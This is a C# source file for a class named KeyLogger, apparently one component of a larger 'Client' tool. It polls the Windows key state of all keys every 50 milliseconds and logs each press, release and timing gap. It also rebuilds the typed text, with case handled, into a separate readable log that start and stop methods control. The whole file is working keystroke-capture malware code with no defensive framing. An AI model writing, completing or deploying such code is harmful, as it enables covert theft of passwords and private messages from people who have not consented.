using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Timer = System.Threading.Timer;

namespace Client
{
    public class KeyLogger
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public static string Log;
        public static string SimpleLog;

        private static bool _working = true;

        private static int _time = 0;

        private static Timer _timer = new Timer(new TimerCallback(Count), null,0, 100);

        private static readonly bool[] Hold = new bool[255];

        private static readonly bool[] Pressed = new bool[255];

        public static async void Loop()
        {
            await Task.Run((() =>
            {

                while (true)
                {
                    if (_working)
                    {
                        Thread.Sleep(50);

                        for (int i = 0; i < 255; i++)
                        {
                            Hold[i] = false;
                        }
                        
                        for (int i = 0; i < 255; i++)
                        {
                            int state = GetAsyncKeyState(i);
                            
                            if (state != 0)
                            {
                                if (_time > 2500)
                                {
                                    Log += $"\n<Time: {_time}>\n";
                                }

                                _time = 0;

                                
                                if (Pressed[i] == false)
                                {
                                    string name = GetKeyName(i);
                                    Log += $"<{name} Pressed>";
                                    name = name.Replace("NumPad", "");
                                    name = name.Replace("D", "");
                                    name = name.Replace("Add", "+");
                                    name = name.Replace("Subtract", "-");
                                    name = name.Replace("Divide", "/");
                                    name = name.Replace("Multiply", "*");
                                    
                                    if (name.Length == 1)
                                    {
                                        if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift)
                                            if(Control.IsKeyLocked(Keys.CapsLock))
                                                SimpleLog += name.ToLower();
                                            else
                                                SimpleLog += name.ToUpper();
                                        else
                                            if (Control.IsKeyLocked(Keys.CapsLock))
                                                SimpleLog += name.ToUpper();
                                            else
                                                SimpleLog += name.ToLower();
                                    }
                                    else
                                    {
                                        if (name == "Enter")
                                            SimpleLog += "\n";
                                        else if(name == "Space")
                                            SimpleLog += " ";
                                        else if (name == "Tab")
                                            SimpleLog += "\t";
                                    }
                                    Pressed[i] = true;
                                }

                                Hold[i] = true;


                            }
                        }

                        for (int i = 0; i < 255; i++)
                        {
                            if (Hold[i] == false && Pressed[i])
                            {
                                Log += $"<{GetKeyName(i)} Released>";
                                Pressed[i] = false;
                            }
                        }

                    }
                }
            }));
        }

        private static string GetKeyName(int i)
        {
            return Enum.GetName(typeof(Keys), i);
        }
        
        private static void Count(object obj)
        {
            _time+= 100;
        }

        public static void Start()
        {
            _working = true;
        }

        public static void Stop()
        {
            _working = false;
        }
    }
}